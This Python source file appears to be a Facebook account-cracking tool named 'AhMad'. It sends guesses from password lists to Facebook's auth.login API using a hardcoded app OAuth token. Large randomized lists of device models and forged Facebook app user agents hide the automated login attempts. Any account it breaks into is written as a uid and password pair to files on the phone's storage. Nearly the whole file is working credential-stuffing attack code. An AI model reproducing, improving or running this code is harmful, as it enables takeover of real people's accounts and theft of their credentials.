scmodel = ['SC-04A', 'SC-01A', 'SC-02A', 'SC-03A', 'SC-05A', 'SC-06A', 'SC-07A', 'SC-08A', 'SC-09A', 'SC-04B', 'SC-01B', 'SC-02B', 'SC-03B', 'SC-05B', 'SC-06B', 'SC-07B', 'SC-08B', 'SC-09B', 'SC-04C', 'SC-01C', 'SC-02C', 'SC-03C', 'SC-05C', 'SC-06C', 'SC-07C', 'SC-08C', 'SC-09C', 'SC-04D', 'SC-01D', 'SC-02D', 'SC-03D', 'SC-05D', 'SC-06D', 'SC-07D', 'SC-08D', 'SC-09D', 'SC-04E', 'SC-01E', 'SC-02E', 'SC-03E', 'SC-05E', 'SC-06E', 'SC-07E', 'SC-08E', 'SC-09E', 'SC-04F', 'SC-01F', 'SC-02F', 'SC-03F', 'SC-05F', 'SC-06F', 'SC-07F', 'SC-08F', 'SC-09F', 'SC-04G', 'SC-01G', 'SC-02G', 'SC-03G', 'SC-05G', 'SC-06G', 'SC-07G', 'SC-08G', 'SC-09G', 'SC-04H', 'SC-01H', 'SC-02H', 'SC-03H', 'SC-05H', 'SC-06H', 'SC-07H', 'SC-08H', 'SC-09H', 'SC-04I', 'SC-01I', 'SC-02I', 'SC-03I', 'SC-05I', 'SC-06I', 'SC-07I', 'SC-08I', 'SC-09I', 'SC-04J', 'SC-01J', 'SC-02J', 'SC-03J', 'SC-05J', 'SC-06J', 'SC-07J', 'SC-08J', 'SC-09J', 'SC-04K', 'SC-01K', 'SC-02K', 'SC-03K', 'SC-05K', 'SC-06K', 'SC-07K', 'SC-08K', 'SC-09K', 'SC-04L', 'SC-01L', 'SC-02L', 'SC-03L', 'SC-05L', 'SC-06L', 'SC-07L', 'SC-08L', 'SC-09L', 'SC-04M', 'SC-01M', 'SC-02M', 'SC-03M', 'SC-05M', 'SC-06M', 'SC-07M', 'SC-08M', 'SC-09M', 'SC-04N', 'SC-01N', 'SC-02N', 'SC-03N', 'SC-05N', 'SC-06N', 'SC-07N', 'SC-08N', 'SC-09N', 'SC-04O', 'SC-01O', 'SC-02O', 'SC-03O', 'SC-05O', 'SC-06O', 'SC-07O', 'SC-08O', 'SC-09O', 'SC-04Q', 'SC-01Q', 'SC-02Q', 'SC-03Q', 'SC-05Q', 'SC-06Q', 'SC-07Q', 'SC-08Q', 'SC-09Q', 'SC-04S', 'SC-01S', 'SC-02S', 'SC-03S', 'SC-05S', 'SC-06S', 'SC-07S', 'SC-08S', 'SC-09S', 'SC-04Y', 'SC-01Y', 'SC-02Y', 'SC-03Y', 'SC-05Y', 'SC-06Y', 'SC-07Y', 'SC-08Y', 'SC-09Y', 'SC-04Z', 'SC-01Z', 'SC-02Z', 'SC-03Z', 'SC-05Z', 'SC-06Z', 'SC-07Z', 'SC-08Z', 'SC-09Z', ]
awms1m=('GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890',"GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H","GT-1060","GT-1065","GT-1070","GT-1075","GT-1080","GT-1085","GT-1090","GT-1230","GT-1490","GT-1470","GT-18780","GT-18762","GT-19090I","GT-19092","GT-19073","GT-19164","GT-19632","GT-19912","GT-19301","GT-19705","GT-2010","GT-20020","GT-210s","GT-3010","GT-416XOP","GT-6998","GT-7090","GT-7060","GT-7080","GT-7150","GT-7950","GT-N7100","GT-N7105","GT-7120","GT-7275","GT-7250","GT-7260R","GT-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H")

def iPhone():
    ios_ver = f'{random.randint(11,15)}_{random.randint(1,3)}'
    br_engine = f"605.{random.randint(1,9)}.{random.randint(10,50)}"
    build = random.choice(["15E148","20E252","20D67","19G71","20E247","20D67","20F5028e","20D47"])
    ua = f'Mozilla/5.0 (iPhone;CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{br_engine} (KHTML,like Gecko) Mobile/{build} [FBAN/FBIOS;FBAV/{random.randint(200,290)}.0.0.{random.randint(11,99)}.69;FBBV/56254015;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/{(ios_ver).replace("_",".")};FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0;FBCR/{random.choice(["Jazz","Zong CM","Ufone"])}]'
    return ua
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AhMad-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(awmSM)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(awmSM)
                                aaaaawm=random.choice(aqib_dalvik_ua)
                                ios_ver = f'{random.randint(9,17)}_{random.randint(1,5)}'
                                br_engine = f"605.{random.randint(1,9)}.{random.randint(10,60)}"
                                build = random.choice(["15E148","20E252","20D67","19G71","20E247","20D67","20F5028e","20D47","16A147","16A146","16A168","16A188","16A149","16A147"])
                                ua = f'Mozilla/5.0 (iPhone;CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{br_engine} (KHTML,like Gecko) Mobile/{build} [FBAN/FBIOS;FBAV/{random.randint(200,290)}.0.0.{random.randint(11,99)}.69;FBBV/56254015;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/{(ios_ver).replace("_",".")};FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0;FBCR/{random.choice(["MTN","Roshan","Etisalat"])}]'
                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH3979','CPH3983','CPH3987','CPH2005','CPH2009','CPH2035','CPH2059','CPH2063','CPH2065','CPH2069','CPH2073','CPH2073','CPH2077','CPH2093','CPH2095','CPH2099','CPH2337','CPH2339','CPH2345','CPH2363','CPH2385','CPH2203','CPH2209','CPH3803','CPH3803','CPH3805','CPH3809','CPH3827','CPH3837','CPH3853','CPH3853','CPH1979','CPH1983','CPH1987','CPH1005','CPH1009','CPH1015','CPH1059','CPH1061','CPH1065','CPH1069','CPH1071','CPH1073','CPH1077','CPH1091','CPH1095','CPH1099','CPH1137','CPH1139','CPH1145','CPH1161','CPH1185','CPH1101','CPH1109','CPH1801','CPH1803','CPH1805','CPH1809','CPH1817','CPH1837','CPH1851','CPH1853'])
                                android_version=str(random.randrange(6,13))
                                M_useragentr = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/Infinix {str(gttt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                M_useragent = 'Davik/2.1.0 (Linux; U; Android  {random.randint(4,13)}; {str(gttt)} Build/NRD90M)  [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FB_FW/2;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCR/AREEBA;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'machine_id':machine_id,
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head ={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": 'unknown',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-connection-quality':'EXCELLENT',
                                'X-FB-device-group': '5120',
                                'x-fb-session-id':'Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                                'User-Agent':M_useragent,   
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AhMad-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AhMad-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AhMad-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AhMad-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,777777777))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(scmodel)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(scmodel)
                                aaaaawm=random.choice(aqib_dalvik_ua)
                                ios_ver = f'{random.randint(9,17)}_{random.randint(1,5)}'
                                br_engine = f"605.{random.randint(1,9)}.{random.randint(10,60)}"
                                build = random.choice(["15E148","20E252","20D67","19G71","20E247","20D67","20F5028e","20D47","16A147","16A146","16A168","16A188","16A149","16A147"])
                                ua = f'Mozilla/5.0 (iPhone;CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{br_engine} (KHTML,like Gecko) Mobile/{build} [FBAN/FBIOS;FBAV/{random.randint(200,290)}.0.0.{random.randint(11,99)}.69;FBBV/56254015;FBDV/iPhone5,2;FBMD/iPhone;FBSN/iOS;FBSV/{(ios_ver).replace("_",".")};FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0;FBCR/{random.choice(["MTN","Roshan","Etisalat"])}]'
                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH3979','CPH3983','CPH3987','CPH2005','CPH2009','CPH2035','CPH2059','CPH2063','CPH2065','CPH2069','CPH2073','CPH2073','CPH2077','CPH2093','CPH2095','CPH2099','CPH2337','CPH2339','CPH2345','CPH2363','CPH2385','CPH2203','CPH2209','CPH3803','CPH3803','CPH3805','CPH3809','CPH3827','CPH3837','CPH3853','CPH3853','CPH1979','CPH1983','CPH1987','CPH1005','CPH1009','CPH1015','CPH1059','CPH1061','CPH1065','CPH1069','CPH1071','CPH1073','CPH1077','CPH1091','CPH1095','CPH1099','CPH1137','CPH1139','CPH1145','CPH1161','CPH1185','CPH1101','CPH1109','CPH1801','CPH1803','CPH1805','CPH1809','CPH1817','CPH1837','CPH1851','CPH1853'])
                                android_version=str(random.randrange(6,13))
                                mirwais = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/str(random.randint(000000000,999999999));FBCR/Etisalat;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 11 Pro;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                M_useragentr = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/Infinix {str(gttt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                M_useragent = f'Davik/2.1.0 (Linux; U; Android {random.randint(5,13)}.0.0; {str(cph)} Build/NRD.{random.randint(1111,9999)}.M.{random.randint(11,99)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.75,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Verizon Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(cph)};FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'try_num':'1',
                                'credentials_type':'password',
                                'community_id':'',
                                'secure_family_device_id':'',
                                'cpl':'true',
                                'currently_logged_in_userid':'0',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'machine_id':machine_id,
                                'meta_inf_fbmeta':'NO_FILE',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head={     
                                "X-FB-Connection-Type": 'MOBILE.LTE',
                                'x-fb-connection-quality':'EXCELLENT',
                                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                                'X-FB-device-group': str(random.randint(2e7,3e7)),
                                "X-FB-Friendly-Name": "authenticate",
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",                 
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": mirwais,
                                'x-fb-rmd':'cached=0;state=NO_MATCH',
                                'x-fb-request-analytics-tags':'unknown',
                                "Connection": "Close",
                                "Accept-Encoding": "gzip, deflate",
                                "X-FB-Server-Cluster": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Client-IP": "True",
                                 'X-FB-HTTP-Engine': 'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AhMad-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AhMad-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AhMad-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AhMad-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AhMad-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()
